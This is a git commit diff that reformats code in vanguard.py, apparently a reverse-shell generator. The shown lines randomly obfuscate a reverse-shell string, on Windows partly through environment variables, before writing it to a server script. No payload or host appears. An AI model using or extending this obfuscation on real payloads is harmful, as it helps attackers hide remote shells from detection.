7a51bb948b029d8678ace57f09371804f3312e8b
Slient <165338136+SilentisVox@users.noreply.github.com>
2024-05-05 15:02:58 -0400

    Update vanguard.py

--- vanguard.py
+++ vanguard.py
@@ -136,22 +136,11 @@ class Generator:
 
         if os.name == 'nt':
             for match in range(int(reverse_shell.count("\\")/2)):
-                reverse_shell = re.sub(pattern,
-                                        lambda m: random.choice([self.list_2_character_2_string,
-                                                                 self.character_2_string,
-                                                                 self.random_string_2_string,
-						                 self.environment_variables_2_string])(m),
-                                        reverse_shell,
-                                        count=1)
+                reverse_shell = re.sub(pattern, lambda m: random.choice([self.list_2_character_2_string, self.character_2_string, self.random_string_2_string, self.environment_variables_2_string])(m), reverse_shell, count=1)
 
-	else: 
+        else: 
             for match in range(int(reverse_shell.count("\\")/2)):
-                reverse_shell = re.sub(pattern,
-                                       lambda m: random.choice([self.list_2_character_2_string,
-                                                                self.character_2_string,
-                                                                self.random_string_2_string])(m),
-                                       reverse_shell,
-                                       count=1)
+                reverse_shell = re.sub(pattern, lambda m: random.choice([self.list_2_character_2_string, self.character_2_string, self.random_string_2_string])(m), reverse_shell, count=1)
         
         with open(f'server/{self.settings.script_name}', 'w') as c:
             c.write(self.script_to_char(reverse_shell))
